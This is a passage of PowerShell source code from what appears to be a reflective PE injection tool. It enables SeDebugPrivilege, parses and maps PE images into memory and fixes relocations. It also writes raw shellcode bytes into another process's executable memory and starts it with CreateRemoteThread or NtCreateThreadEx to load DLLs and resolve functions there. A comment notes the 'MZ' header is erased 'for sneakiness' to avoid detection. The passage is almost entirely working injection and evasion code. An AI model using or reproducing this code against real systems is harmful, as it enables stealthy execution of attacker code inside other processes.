		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}

		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}


	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,

		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,

		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,

		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)

		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero

		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}

		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}

		return $RemoteThreadHandle
	}



	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		$NtHeadersInfo = New-Object System.Object

		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)

		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }

		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}

		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		$PEInfo = New-Object System.Object

		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null

		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types

		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)

		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)

		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}

		$PEInfo = New-Object System.Object

		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types

		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}

		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}

		return $PEInfo
	}


	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,

		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)

		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}

		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes

		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}


			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem

			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)


			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}

			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}

			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}

			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}

			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}

			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

		return $DllAddress
	}


	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,

		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,

		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }

		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes


		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}


		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem

		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)

		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}

		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}

		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }

		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)

			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))

			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}

			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}

			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}

			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)

		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}

		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
